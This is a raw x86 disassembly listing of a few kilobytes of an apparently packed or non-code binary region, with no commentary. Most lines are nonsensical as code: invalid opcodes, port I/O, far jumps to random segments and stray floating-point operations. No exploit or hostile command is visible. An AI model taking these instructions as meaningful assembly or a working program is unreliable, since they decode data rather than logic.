  41467e:	sbb    ebp,DWORD PTR [eax-0x718b7dfb]
  414684:	ds hlt 
  414686:	popa   
  414687:	out    0x22,eax
  414689:	xor    ebx,DWORD PTR [edi]
  41468b:	sbb    al,0xb2
  41468d:	jne    0x41468e
  41468f:	fdivr  QWORD PTR [edi-0x28]
  414692:	xchg   edi,eax
  414693:	fwait
  414694:	or     BYTE PTR [edx+0x46b26e51],ch
  41469a:	fsub   QWORD PTR [edi-0x18]
  41469d:	ds cmp eax,0x42061ed5
  4146a3:	test   eax,0x6874e9d0
  4146a8:	lods   al,BYTE PTR ds:[esi]
  4146a9:	mov    edi,0xd666dc5f
  4146ae:	call   0x286f1a14
  4146b3:	(bad)  
  4146b4:	loop   0x4146f1
  4146b6:	sbb    al,0x74
  4146b8:	and    bl,BYTE PTR [ecx+0x4f1e3dfd]
  4146be:	xor    DWORD PTR [esi],ebx
  4146c0:	cmp    eax,0xd45a0cba
  4146c5:	(bad)  
  4146c6:	out    dx,al
  4146c7:	sub    eax,DWORD PTR [esp+edi*8]
  4146ca:	inc    edx
  4146cb:	sub    BYTE PTR ds:0xacd7e57a,ah
  4146d1:	jmp    0xe978:0x72a7c9d3
  4146d8:	xor    DWORD PTR [ebp-0x7ef7f943],edi
  4146de:	push   eax
  4146df:	(bad)  
  4146e0:	aam    0xac
  4146e2:	shl    DWORD PTR [edx+0xd518246],cl
  4146e8:	cmp    eax,0x4ac65065
  4146ed:	jno    0x41475c
  4146ef:	pop    es
  4146f0:	call   0x10f3:0xa9222aaa
  4146f7:	lds    esp,FWORD PTR [ecx-0x33]
  4146fa:	pusha  
  4146fb:	(bad)  
  4146fc:	cwde   
  4146fd:	scas   eax,DWORD PTR es:[edi]
  4146fe:	pusha  
  4146ff:	sub    eax,0x70e1b21f
  414704:	xor    al,0x84
  414706:	lods   al,BYTE PTR ds:[esi]
  414707:	call   DWORD PTR [ebp-0x81f325c]
  41470d:	cmp    DWORD PTR [edi-0x2],ecx
  414710:	mov    bh,0x3c
  414712:	loopne 0x4146b7
  414714:	fwait
  414715:	jl     0x41470d
  414717:	inc    esp
  414718:	adc    dl,BYTE PTR [edx+0x1f]
  41471b:	loop   0x4146d1
  41471d:	loop   0x4146be
  41471f:	push   cs
  414720:	aaa    
  414721:	pop    ebp
  414722:	sub    ebp,DWORD PTR [ebx]
  414724:	test   BYTE PTR [ebp-0x2b],0xa3
  414728:	xor    BYTE PTR [eax+0x6346dc40],bh
  41472e:	dec    ecx
  41472f:	outs   dx,BYTE PTR ds:[esi]
  414730:	popa   
  414731:	inc    ebx
  414732:	pop    esi
  414733:	push   ds
  414734:	mov    BYTE PTR ds:0x9550f3fd,0xe8
  41473b:	sub    edi,DWORD PTR [esi]
  41473d:	dec    ecx
  41473e:	adc    BYTE PTR [edi],bl
  414740:	aas    
  414741:	(bad)  
  414742:	add    esp,0x96c085b4
  414748:	sub    al,0xc5
  41474a:	push   0x7e
  41474c:	fisttp WORD PTR [edi]
  41474e:	mov    cl,0x91
  414750:	cli    
  414751:	or     ch,BYTE PTR [ebp+0x72fa2f75]
  414757:	sbb    al,0xf7
  414759:	fidivr WORD PTR [eax]
  41475b:	xor    BYTE PTR [ecx],al
  41475d:	mov    bh,dh
  41475f:	ret    
  414760:	lods   al,BYTE PTR ds:[esi]
  414761:	test   BYTE PTR [eax+0x21],bh
  414764:	sbb    bh,BYTE PTR [ebx-0x57]
  414767:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414768:	data16 fistp DWORD PTR [edi+eax*1-0x25]
  41476d:	jb     0x4147b4
  41476f:	push   cs
  414770:	mov    bl,BYTE PTR [ecx]
  414772:	dec    esp
  414773:	cld    
  414774:	bound  ebp,QWORD PTR [ebp+0x54]
  414777:	push   edx
  414778:	push   ecx
  414779:	and    ah,bl
  41477b:	sbb    eax,0x6c7b0e55
  414780:	pop    es
  414781:	jge    0x41474b
  414783:	pop    edi
  414784:	mov    bh,0x97
  414786:	out    dx,eax
  414787:	mov    esp,0x3ef6452a
  41478c:	xchg   ecx,eax
  41478d:	jae    0x4147c6
  41478f:	loopne 0x41473d
  414791:	ret    0xddc
  414794:	mov    esp,0xfc3f374e
  414799:	mov    bl,0x36
  41479b:	in     eax,0x10
  41479d:	aas    
  41479e:	adc    al,0x38
  4147a0:	adc    eax,eax
  4147a2:	mov    dh,0x90
  4147a5:	push   ss
  4147a6:	jp     0x4147b7
  4147a8:	jg     0x4147e2
  4147aa:	das    
  4147ab:	xchg   ecx,eax
  4147ac:	mov    ecx,0xe763071e
  4147b1:	pop    ecx
  4147b2:	mov    ebp,0x4fbcae29
  4147b7:	dec    ecx
  4147b8:	or     ebx,ecx
  4147ba:	outs   dx,DWORD PTR ds:[esi]
  4147bb:	jno    0x4147c0
  4147bd:	imul   edx,DWORD PTR [esi+0x63],0x14
  4147c1:	pop    esp
  4147c2:	retf   
  4147c3:	add    DWORD PTR [edx+0x76e300bd],esi
  4147c9:	mov    ch,0xf5
  4147cb:	or     al,0x5c
  4147cd:	stc    
  4147ce:	jmp    0x41475b
  4147d0:	int3   
  4147d1:	add    BYTE PTR [edx-0x26c4f928],dl
  4147d7:	push   ecx
  4147d8:	(bad)  
  4147d9:	aaa    
  4147da:	mov    BYTE PTR ds:0x5209085c,bl
  4147e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147e1:	fimul  WORD PTR [edx-0x50]
  4147e4:	pushf  
  4147e5:	popf   
  4147e6:	fs enter 0xc3c3,0xdc
  4147eb:	dec    ebx
  4147ec:	mov    bl,BYTE PTR [eax]
  4147ee:	dec    ebx
  4147ef:	aas    
  4147f0:	popf   
  4147f1:	jl     0x414845
  4147f3:	in     al,dx
  4147f4:	push   ds
  4147f5:	lds    edx,FWORD PTR [edx+0x2aec1e5f]
  4147fb:	inc    eax
  4147fc:	xor    DWORD PTR [edx],eax
  4147fe:	and    ecx,0x73
  414801:	outs   dx,BYTE PTR ds:[esi]
  414802:	(bad)  
  414804:	call   0xfc5b561d
  414809:	mov    WORD PTR [edi+0x13],?
  41480c:	cmc    
  41480d:	jecxz  0x41484d
  41480f:	jle    0x414827
  414811:	in     eax,dx
  414812:	iret   
  414813:	mov    DWORD PTR [ebx+0x5c5dff07],esi
  414819:	jg     0x4147a9
  41481b:	pusha  
  41481c:	xchg   esi,eax
  41481d:	mov    esp,gs
  41481f:	int    0xd6
  414821:	scas   eax,DWORD PTR es:[edi]
  414822:	sbb    esi,DWORD PTR [ebp+0x30835b5]
  414828:	fsubr  st(5),st
  41482a:	jns    0x41489c
  41482c:	push   cs
  41482d:	aad    0xd3
  41482f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414830:	fwait
  414831:	fwait
  414832:	pop    esi
  414833:	jmp    0x414834
  414835:	mov    bl,0x4
  414837:	ror    DWORD PTR [edx],1
  414839:	js     0x414813
  41483b:	in     al,dx
  41483c:	(bad)  
  41483d:	sbb    BYTE PTR [eax-0x2c672771],cl
  414843:	sub    al,0xfc
  414845:	or     al,0xe4
  414847:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414848:	jmp    0xeff454d4
  41484d:	xor    ch,BYTE PTR [ebx+0x42c3db9f]
  414853:	cwde   
  414854:	out    0xc,eax
  414856:	scas   al,BYTE PTR es:[edi]
  414857:	shl    DWORD PTR [ebp+0x37c1c827],cl
  41485d:	fwait
  41485e:	dec    esp
  41485f:	mov    ecx,0xdd5c1222
  414864:	repnz inc ebx
  414866:	arpl   WORD PTR [ecx],ax
  414868:	fnstcw WORD PTR [ecx]
  41486a:	jmp    0xf697c6
  41486f:	ds mov ebx,0xecb96897
  414875:	aas    
  414876:	jge    0x414899
  414878:	xchg   esi,eax
  414879:	out    0xc8,al
  41487b:	es dec eax
  41487d:	push   ss
  41487e:	sbb    eax,0x16
  414881:	push   ds
  414882:	jl     0x414817
  414884:	jge    0x4148ef
  414886:	mov    ds:0x5a4c1f0b,al
  41488b:	jb     0x41481f
  41488d:	std    
  41488e:	sub    esi,edi
  414890:	ds push esp
  414892:	mov    ecx,0x31823c6e
  414897:	mov    al,ds:0x344bc917
  41489c:	push   cs
  41489d:	mov    es,WORD PTR [edi+0x74e6698f]
  4148a3:	dec    esp
  4148a4:	or     al,0x60
  4148a6:	mov    dl,0x1f
  4148a8:	mov    al,ds:0xd5460af7
  4148ad:	js     0x4148fa
  4148af:	mov    ch,0xd4
  4148b1:	fs mov bl,0x1d
  4148b4:	lock loopne 0x4148e4
  4148b7:	imul   esi,DWORD PTR [edi],0x69
  4148ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148bb:	scas   eax,DWORD PTR es:[edi]
  4148bc:	or     eax,0x5e8fc8e7
  4148c1:	fsubr  DWORD PTR [ebp+0x54]
  4148c4:	cmp    bh,BYTE PTR [esi-0x253d5160]
  4148ca:	mov    ds:0x4c13b4a0,al
  4148cf:	outs   dx,BYTE PTR ds:[esi]
  4148d0:	adc    DWORD PTR [edi-0x61b7571c],esi
  4148d6:	xchg   ebp,eax
  4148d7:	pop    ebp
  4148d8:	or     esi,DWORD PTR [ebx-0x148e9f4d]
  4148de:	dec    esi
  4148df:	dec    edx
  4148e0:	ss inc ecx
  4148e2:	es add al,dh
  4148e5:	sub    al,0x9a
  4148e7:	adc    DWORD PTR [edi-0x45],0xa112e8e
  4148ee:	pop    ecx
  4148ef:	fbstp  TBYTE PTR [edx+0x13]
  4148f2:	ds sub DWORD PTR ss:[ecx+0x25],esi
  4148f7:	pusha  
  4148f8:	and    ecx,DWORD PTR [eax]
  4148fa:	jae    0x41490b
  4148fc:	mov    ah,0xee
  4148fe:	jge    0x41496f
  414900:	or     al,0x42
  414902:	jge    0x4148f7
  414904:	sti    
  414905:	scas   al,BYTE PTR es:[edi]
  414906:	sbb    ebx,ebp
  414908:	inc    ebp
  414909:	xchg   ebp,eax
  41490a:	into   
  41490b:	(bad)  
  41490c:	lahf   
  41490d:	pop    ds
  41490e:	gs pop esp
  414910:	cwde   
  414911:	mov    dh,0x72
  414913:	fsubr  DWORD PTR [ebx-0x52]
  414916:	sti    
  414917:	add    edx,ebp
  414919:	into   
  41491a:	pop    ebp
  41491b:	jp     0x4148bb
  41491d:	nop
  41491e:	and    al,0x9e
  414920:	push   eax
  414921:	mov    ah,0x44
  414923:	xlat   BYTE PTR fs:[ebx]
  414925:	stc    
  414926:	out    0x63,eax
  414928:	addr16 and eax,0x43d3878a
  41492e:	push   ebx
  41492f:	pop    eax
  414930:	call   DWORD PTR [eax-0x1]
  414933:	mov    eax,DWORD PTR [ebp-0x38]
  414936:	mov    ecx,DWORD PTR ds:0x426b5e
  41493c:	add    DWORD PTR [eax],ecx
  41493e:	pop    edi
  41493f:	jmp    0x414e4a
  414944:	(bad)  
  414945:	rol    ah,1
  414947:	int3   
  414948:	fcmove st,st(4)
  41494a:	(bad)  
  41494b:	fimul  DWORD PTR [ebp+0x7f831ddd]
  414951:	mov    ch,0xf
  414953:	ds mov dl,0x24
  414956:	jg     0x4149d0
  414958:	push   0x7c
  41495a:	js     0x4149d4
  41495c:	pop    es
  41495d:	pop    ebx
  41495e:	popf   
  41495f:	xor    DWORD PTR [ebx],ebx
  414961:	pusha  
  414962:	lods   al,BYTE PTR ds:[esi]
  414963:	cmp    dl,BYTE PTR [eax+eiz*2+0x6e]
  414967:	pop    DWORD PTR [eax+0x33]
  41496a:	sub    DWORD PTR [edx],0x580833b6
  414970:	pushf  
  414971:	ret    
  414972:	xchg   esi,eax
  414973:	xchg   ebp,eax
  414974:	pushf  
  414975:	stos   BYTE PTR es:[edi],al
  414976:	mov    ebp,0xd5eaf583
  41497b:	mov    eax,ss:0x37972910
  414981:	inc    esp
  414982:	xchg   edx,eax
  414983:	(bad)  
  414984:	push   0x4a
  414986:	push   ds
  414987:	mov    ds:0xa1f88430,al
  41498c:	adc    eax,0xa4483197
  414991:	xor    edi,DWORD PTR [esi+0x4a33dba6]
  414997:	fucomp st(1)
  414999:	xchg   BYTE PTR [edi+0x33615fcf],bl
  41499f:	aad    0xba
  4149a1:	inc    ebp
  4149a2:	lods   al,BYTE PTR ds:[esi]
  4149a3:	jae    0x414968
  4149a5:	leave  
  4149a6:	push   ebx
  4149a7:	lods   al,BYTE PTR ds:[esi]
  4149a8:	scas   eax,DWORD PTR es:[edi]
  4149a9:	sbb    al,0x7c
  4149ab:	inc    ebp
  4149ac:	jp     0x4149cf
  4149ae:	aad    0x48
  4149b0:	mov    BYTE PTR [ecx],bh
  4149b2:	adc    BYTE PTR [ebx+0x5e],bh
  4149b5:	jb     0x414a2a
  4149b7:	loope  0x414a04
  4149b9:	int3   
  4149ba:	sub    DWORD PTR [edi],edx
  4149bc:	mov    ds:0x558d1832,al
  4149c1:	ds push ebx
  4149c3:	and    eax,0x995e9b0e
  4149c8:	push   cs
  4149c9:	push   ebp
  4149ca:	xchg   edi,eax
  4149cb:	dec    ebp
  4149cc:	icebp  
  4149cd:	cmp    eax,esp
  4149cf:	lods   eax,DWORD PTR ds:[esi]
  4149d0:	repz ss jge 0x414a0d
  4149d4:	sbb    eax,0x3c6e973a
  4149d9:	fs mov dl,0x9f
  4149dc:	inc    edi
  4149dd:	and    al,0xe9
  4149df:	inc    esp
  4149e0:	jl     0x4149e3
  4149e2:	jle    0x4149f0
  4149e4:	bound  eax,QWORD PTR [edx+ebx*4]
  4149e7:	fs out dx,al
  4149e9:	pop    ebp
  4149ea:	pop    ds
  4149eb:	cmp    BYTE PTR [ebp+edi*1+0x2a],ch
  4149ef:	outs   dx,BYTE PTR ds:[esi]
  4149f0:	(bad)  
  4149f2:	fadd   st(0),st
  4149f4:	lods   eax,DWORD PTR ds:[esi]
  4149f5:	test   bh,cl
  4149f7:	xchg   esi,eax
  4149f8:	jo     0x414a0b
  4149fa:	aam    0xfb
  4149fc:	test   ch,0x8
  4149ff:	jb     0x414a24
  414a01:	iret   
  414a02:	push   edi
  414a03:	out    dx,eax
  414a04:	mov    esp,0xb7297b7
  414a09:	mov    eax,ds:0x5d66f11b
  414a0e:	loope  0x414a85
  414a10:	or     DWORD PTR [eax-0x17],0x6b
  414a14:	stos   BYTE PTR es:[edi],al
  414a15:	mov    ah,0x27
  414a17:	mov    es,eax
  414a19:	xor    DWORD PTR [edi],ecx
  414a1b:	aam    0xe3
  414a1d:	daa    
  414a1e:	push   ss
  414a1f:	mov    edx,0x38a968fe
  414a24:	push   eax
  414a25:	and    ebp,DWORD PTR [ebx+eiz*8+0x97154a3]
  414a2c:	cmp    edi,DWORD PTR [ebp+0x1b]
  414a2f:	push   edi
  414a30:	retf   
  414a31:	jmp    0xcd64fc00
  414a36:	stc    
  414a37:	leave  
  414a38:	mov    cl,0xf8
  414a3a:	mov    cl,0x84
  414a3c:	aaa    
  414a3d:	cmp    DWORD PTR [ebp-0x4a],eax
  414a40:	add    eax,0x994930a3
  414a45:	aam    0x56
  414a47:	mov    cl,0x45
  414a49:	ins    BYTE PTR es:[edi],dx
  414a4a:	std    
  414a4b:	cmc    
  414a4c:	add    BYTE PTR [ecx],dh
  414a4e:	and    DWORD PTR [eax+0x7b],ecx
  414a51:	dec    eax
  414a52:	jns    0x414abe
  414a54:	lds    ebp,FWORD PTR [ecx]
  414a56:	sub    esp,0x62
  414a59:	outs   dx,BYTE PTR ds:[esi]
  414a5a:	pop    esp
  414a5b:	xor    eax,0x15535c68
  414a60:	in     al,0x49
  414a62:	jl     0x414ab3
  414a64:	sbb    bl,BYTE PTR [edx-0x8ef3147]
  414a6a:	out    dx,al
  414a6b:	push   ss
  414a6c:	mov    WORD PTR cs:[ecx],cs
  414a6f:	repz aaa 
  414a71:	jnp    0x414a16
  414a73:	loope  0x414a57
  414a75:	cwde   
  414a76:	xchg   ebx,eax
  414a77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a79:	pop    eax
  414a7a:	pop    eax
  414a7b:	bnd ret 0xea04
  414a7f:	cld    
  414a80:	add    esp,ebx
  414a82:	or     DWORD PTR [edi],ebp
  414a84:	test   al,0x7
  414a86:	sahf   
  414a87:	push   ecx
  414a88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a89:	fcomp  QWORD PTR [eax-0x4e]
  414a8c:	scas   al,BYTE PTR es:[edi]
  414a8d:	cdq    
  414a8e:	jns    0x414aa0
  414a90:	int3   
  414a91:	pop    esi
  414a92:	mov    cl,0x10
  414a94:	movaps xmm2,XMMWORD PTR ds:0x8e9e2555
  414a9b:	mov    WORD PTR [edx+ebp*4+0x5f],?
  414a9f:	imul   edx,DWORD PTR [ecx-0x6ba6f3de],0x68e6504f
  414aa9:	fst    st(2)
  414aab:	sbb    eax,0xcf0b722c
  414ab0:	push   ebp
  414ab1:	cmc    
  414ab2:	pop    edx
  414ab3:	cwde   
  414ab4:	push   ebx
  414ab5:	pop    es
  414ab6:	mov    DWORD PTR [edi+0x12],0x1c3efe72
  414abd:	pushf  
  414abe:	repz aas 
  414ac0:	dec    ebx
  414ac1:	test   al,0xb
  414ac3:	adc    eax,0xdef822ba
  414ac8:	js     0x414b22
  414aca:	mov    bl,al
  414acc:	sub    BYTE PTR [edi],al
  414ace:	mov    ah,0xa5
  414ad0:	jge    0x414a84
  414ad2:	stos   DWORD PTR es:[edi],eax
  414ad3:	inc    edx
  414ad4:	xor    eax,0x7c6a6e53
  414ad9:	inc    esi
  414ada:	jne    0x414af0
  414adc:	adc    eax,0x1689cdd6
  414ae1:	arpl   ax,sp
  414ae3:	adc    ebx,DWORD PTR [ecx+eax*2+0x66e5503b]
  414aea:	clc    
  414aeb:	retf   0x4bab
  414aee:	mov    bl,0x44
  414af0:	cmp    al,0xf8
  414af2:	mov    al,dh
  414af4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414af5:	mov    ah,0x61
  414af7:	fprem1 
  414af9:	scas   al,BYTE PTR es:[edi]
  414afa:	out    0xbd,eax
  414afc:	inc    ebx
  414afd:	jmp    0xc6ca:0xbca0d703
  414b04:	stc    
  414b05:	and    DWORD PTR [ebx],edi
  414b07:	in     al,dx
  414b08:	fdivr  st,st(7)
  414b0a:	mov    cl,BYTE PTR [edi+0x6e]
  414b0d:	bound  esp,QWORD PTR ds:0x6f9b59c0
  414b13:	sub    eax,0xc69db8e4
  414b18:	or     eax,0xd4c72b3e
  414b1d:	rol    BYTE PTR [eax+0x27],1
  414b20:	ja     0x414ad5
  414b22:	adc    al,0x25
  414b24:	sub    esp,ebp
  414b26:	int    0x46
  414b28:	mov    eax,0x13a6659d
  414b2d:	xchg   dh,ah
  414b2f:	push   es
  414b30:	fbstp  TBYTE PTR [edi+0x42ce6bd2]
  414b36:	add    BYTE PTR [ecx+0x5c527552],bh
  414b3c:	sbb    ah,BYTE PTR [ecx+0x13c02032]
  414b42:	in     al,dx
  414b43:	push   eax
  414b44:	bound  eax,QWORD PTR ds:0xac87e305
  414b4a:	popf   
  414b4b:	xchg   ecx,eax
  414b4c:	pusha  
  414b4d:	retf   
  414b4e:	call   0x8cbcce83
  414b53:	sbb    al,0x84
  414b55:	or     bl,BYTE PTR [ecx-0x23]
  414b58:	sti    
  414b59:	addr16 jg 0x414b15
  414b5c:	leave  
  414b5d:	mov    ebp,0xf14c38e1
  414b62:	add    al,0xbe
  414b64:	mov    al,0x86
  414b66:	mov    al,0x39
  414b68:	stos   BYTE PTR es:[edi],al
  414b69:	push   esp
  414b6a:	not    BYTE PTR [esi]
  414b6c:	add    bl,BYTE PTR [edx+0xf]
  414b6f:	adc    BYTE PTR [edx],bl
  414b71:	cdq    
  414b72:	cdq    
  414b73:	pop    esi
  414b74:	adc    BYTE PTR [ebx+0x36],bl
  414b77:	adc    al,BYTE PTR [edi+0x7f]
  414b7a:	sub    eax,0xbe0bc22e
  414b7f:	not    DWORD PTR [edx-0x6a]
  414b82:	arpl   WORD PTR [ecx+0x720c8b41],dx
  414b88:	icebp  
  414b89:	shr    ebp,cl
  414b8b:	sbb    edx,DWORD PTR [edx]
  414b8d:	push   ss
  414b8e:	mov    ah,ah
  414b90:	dec    eax
  414b91:	imul   ebp,DWORD PTR [ecx-0x3b617348],0x70
  414b98:	mov    BYTE PTR [edi],ah
  414b9a:	ror    BYTE PTR [ebx],0xfd
  414b9d:	std    
  414b9e:	mov    edx,0xdfdd10bf
  414ba3:	call   0xe5daf804
  414ba8:	mov    esp,es
  414baa:	pushf  
  414bab:	dec    esp
  414bac:	sbb    esp,DWORD PTR [bp+0x2b25]
  414bb1:	xor    cl,BYTE PTR [eax+0x62]
  414bb4:	rol    DWORD PTR [esi-0x13],0x99
  414bb8:	aad    0xc9
  414bba:	shl    ebx,1
  414bbc:	sub    BYTE PTR [edi+0x2f],ah
  414bbf:	psrlw  mm4,QWORD PTR [eax+0x27]
  414bc3:	out    0xa7,al
  414bc5:	and    eax,ecx
  414bc7:	xor    eax,0x6505d79
  414bcc:	push   ebp
  414bcd:	jge    0x414bf1
  414bcf:	xor    eax,0xe2e23b2
  414bd4:	adc    BYTE PTR [esi+0x1e3dad94],cl
  414bda:	js     0x414c3a
  414bdc:	push   es
  414bdd:	mov    ch,0x16
  414bdf:	inc    edi
  414be0:	(bad)  
  414be1:	inc    BYTE PTR [esi+0x43]
  414be4:	sub    cl,BYTE PTR [esi]
  414be6:	add    ah,BYTE PTR [edx+0x368a5626]
  414bec:	stc    
  414bed:	rcl    esi,1
  414bef:	inc    ecx
  414bf0:	xchg   DWORD PTR [eax],edx
  414bf2:	sub    eax,0x3a969025
  414bf7:	xlat   BYTE PTR ds:[ebx]
  414bf8:	lock xor bh,BYTE PTR [edi-0x67d311c7]
  414bff:	lea    eax,[eax]
  414c01:	test   eax,0xe9f51601
  414c06:	call   0x4f09b928
  414c0b:	jl     0x414b93
  414c0d:	and    DWORD PTR [edi-0x74f68699],ebp
  414c13:	or     al,0xc6
  414c16:	fidiv  DWORD PTR [bx+si+0x10c6]
  414c1b:	add    DWORD PTR [edx+0x1086a9c5],esp
  414c21:	sub    DWORD PTR [eax+ebp*1],esp
  414c24:	enter  0x183f,0x37
  414c28:	cmc    
  414c29:	aad    0x1a
  414c2b:	cmp    BYTE PTR [ebx],0xbb
  414c2e:	inc    ebp
  414c2f:	imul   ebx,DWORD PTR [esi+0x53],0x1aec776e
  414c36:	popa   
  414c37:	push   edi
  414c38:	push   esi
  414c39:	in     al,dx
  414c3a:	mov    esi,0x12f03246
  414c3f:	xchg   ebx,ebx
  414c41:	pop    edi
  414c42:	je     0x414c6e
  414c44:	test   BYTE PTR [ecx+0x2],0xab
  414c48:	mov    ecx,0x2a3cf341
  414c4d:	add    al,0xa5
  414c4f:	test   eax,0x3912e112
  414c54:	clc    
  414c55:	outs   dx,BYTE PTR ds:[esi]
  414c56:	dec    ebp
  414c57:	adc    al,0x5d
  414c59:	cmovo  esi,esi
  414c5c:	(bad)  [edx-0x4f]
  414c5f:	ins    BYTE PTR es:[edi],dx
  414c60:	out    dx,eax
  414c61:	punpckldq mm1,DWORD PTR [edx-0x68]
  414c65:	dec    esp
  414c66:	jmp    DWORD PTR [edx]
  414c68:	arpl   bx,di
  414c6a:	pusha  
  414c6b:	leave  
  414c6c:	mov    ebp,0xf593869f
  414c71:	mov    ebx,0xc324c573
  414c76:	xor    edi,ebx
  414c78:	loope  0x414cc3
  414c7a:	inc    esi
  414c7b:	retf   
  414c7c:	mov    WORD PTR [ebp+0x73ca0bc],gs
  414c82:	jno    0x414c99
  414c84:	dec    ecx
  414c85:	out    0xd5,eax
  414c87:	add    BYTE PTR [ebx],bh
  414c89:	stc    
  414c8a:	leave  
  414c8b:	ins    DWORD PTR es:[di],dx
  414c8d:	push   ecx
  414c8e:	fs stos DWORD PTR es:[edi],eax
  414c90:	aad    0x23
  414c92:	push   0x4aea3910
  414c97:	ins    BYTE PTR es:[edi],dx
  414c98:	es data16 mov bl,0xc9
  414c9c:	jbe    0x414c79
  414c9e:	mov    dl,0xe8
  414ca0:	pop    ss
  414ca1:	and    eax,eax
  414ca3:	stos   DWORD PTR es:[edi],eax
  414ca4:	lods   al,BYTE PTR ds:[esi]
  414ca5:	inc    esp
  414ca6:	test   al,0x36
  414ca8:	xchg   BYTE PTR [ebp+0x5c],al
  414cab:	inc    esp
  414cac:	adc    dl,BYTE PTR [edi]
  414cae:	mov    cl,0x86
  414cb0:	mov    eax,ds:0x4f74f919
  414cb5:	push   ecx
  414cb6:	inc    ebp
  414cb7:	sub    DWORD PTR [ebx+0x59],0x3c9e4572
  414cbe:	jp     0x414c83
  414cc0:	stc    
  414cc1:	pop    ebp
  414cc2:	pusha  
  414cc3:	mov    esi,0x812c5219
  414cc8:	xor    al,0x6
  414cca:	test   DWORD PTR [ebp-0x59],ebx
  414ccd:	fdiv   st(6),st
  414ccf:	mov    bl,0xd8
  414cd1:	sbb    BYTE PTR [edx+0x32],dl
  414cd4:	xor    bh,dh
  414cd6:	sbb    eax,0x874f111b
  414cdb:	inc    ebp
  414cdc:	pop    edi
  414cdd:	mov    ecx,0xaf4f2ecf
  414ce2:	push   edx
  414ce3:	adc    al,0xc9
  414ce5:	mov    cl,ch
  414ce7:	jg     0x414cf2
  414ce9:	jp     0x414c8d
  414ceb:	cmp    al,0x14
  414ced:	pop    ebp
  414cee:	jecxz  0x414d50
  414cf0:	xchg   edx,eax
  414cf1:	ins    BYTE PTR es:[edi],dx
  414cf2:	push   ebp
  414cf3:	jl     0x414c90
  414cf5:	pop    ecx
  414cf6:	push   ss
  414cf7:	mov    esi,esp
  414cf9:	add    ecx,DWORD PTR [ecx+0x6]
  414cfc:	cmp    ebp,DWORD PTR [edx+0x5c9456cb]
  414d02:	pop    edx
  414d03:	sahf   
  414d04:	arpl   WORD PTR [edi-0x17815d2f],sp
  414d0a:	xlat   BYTE PTR ds:[ebx]
  414d0b:	xor    edx,DWORD PTR [eax]
  414d0d:	test   BYTE PTR [ebp+0x15d02527],ah
  414d13:	dec    esi
  414d14:	xchg   DWORD PTR [edx+0xd],ecx
  414d17:	mov    eax,0xe941dd9f
  414d1c:	and    ah,cl
  414d1e:	mov    ds:0x667613a4,eax
  414d23:	dec    esi
  414d24:	fs push ds
  414d26:	cmp    BYTE PTR [edi-0x1a5b49b4],0x39
  414d2d:	sub    al,0x39
  414d2f:	das    
  414d30:	push   ss
  414d31:	dec    ebp
  414d32:	sbb    DWORD PTR [edx-0x61],ebx
  414d35:	int    0xc5
  414d37:	push   0x58
  414d39:	call   0xb60e:0x73563826
  414d40:	mov    eax,esp
  414d42:	mov    esi,0x48bb5d67
  414d47:	cli    
  414d48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d49:	repz inc ebx
  414d4b:	push   es
  414d4c:	add    al,0xd5
  414d4e:	lock jmp 0xeaf5e6d8
  414d54:	dec    eax
  414d55:	addr16 pop ss
  414d57:	jge    0x414d5f
  414d59:	shr    dl,1
  414d5b:	jmp    0xe616:0x9aa9619f
  414d62:	jmp    0x3bfe:0xcd9a3430
  414d69:	inc    esi
  414d6a:	rep ins BYTE PTR es:[edi],dx
  414d6c:	cdq    
  414d6d:	push   ds
  414d6e:	rcl    BYTE PTR [edx+0x4b60d68d],cl
  414d74:	call   0x9a68:0x51479989
  414d7b:	cmp    eax,0xaf273a45
  414d80:	pop    DWORD PTR [edi+0x732e4d9d]
  414d86:	pop    ebx
  414d87:	jle    0x414d2d
  414d89:	imul   ebp,DWORD PTR [edi-0x4d],0x72
  414d8d:	fidiv  WORD PTR [edx+0x1f]
  414d90:	push   ecx
  414d91:	outs   dx,DWORD PTR ds:[esi]
  414d92:	ins    DWORD PTR es:[edi],dx
  414d93:	jmp    0x8d58809d
  414d98:	mov    bh,0xaa
  414d9a:	adc    ah,BYTE PTR [ebx+0x72]
  414d9d:	jb     0x414e15
  414d9f:	mov    WORD PTR [edi],es
  414da1:	or     al,0x13
  414da3:	ss jmp ecx
  414da6:	stos   DWORD PTR es:[edi],eax
  414da7:	sbb    eax,0x783b0487
  414dac:	neg    DWORD PTR ds:0xd6d4171f
  414db2:	mov    ecx,esp
  414db4:	and    al,0x72
  414db6:	inc    edi
  414db7:	and    DWORD PTR ds:0xb39385d0,eax
  414dbd:	pop    edi
  414dbe:	call   0x1695350c
  414dc3:	adc    ah,bh
  414dc5:	pop    ecx
  414dc6:	xchg   ebx,eax
  414dc7:	loop   0x414e39
  414dc9:	jnp    0x414de1
  414dcb:	dec    eax
  414dcc:	(bad)  
  414dcd:	fs pop esi
  414dcf:	xor    eax,DWORD PTR [ebx+esi*2]
  414dd2:	lahf   
  414dd3:	jne    0x414dcf
  414dd5:	push   esi
  414dd6:	ret    0x1803
  414dd9:	sub    al,0x62
  414ddb:	int3   
  414ddc:	mov    WORD PTR [ecx],es
  414dde:	sbb    BYTE PTR [esi+0x1c],0xcd
  414de2:	cmp    DWORD PTR [edx+0x22],esi
  414de5:	jno    0x414db8
  414de7:	lds    edi,FWORD PTR [esi]
  414de9:	shl    dh,0xd
  414dec:	idiv   ebp
  414dee:	dec    esp
  414def:	cmp    eax,0x52322bf
  414df4:	inc    edi
  414df5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414df6:	sti    
  414df7:	push   ebp
  414df8:	mov    bh,0x78
  414dfa:	mov    ah,0xed
  414dfc:	lea    edi,[ecx]
  414dfe:	pop    esp
  414dff:	dec    ebx
  414e00:	lds    esi,FWORD PTR [ebx+0x2bec9131]
  414e06:	mov    al,ds:0x793be908
  414e0b:	es dec ebx
  414e0d:	hlt    
  414e0e:	cmp    ah,ah
  414e10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e11:	add    bl,BYTE PTR [ecx]
  414e13:	cmc    
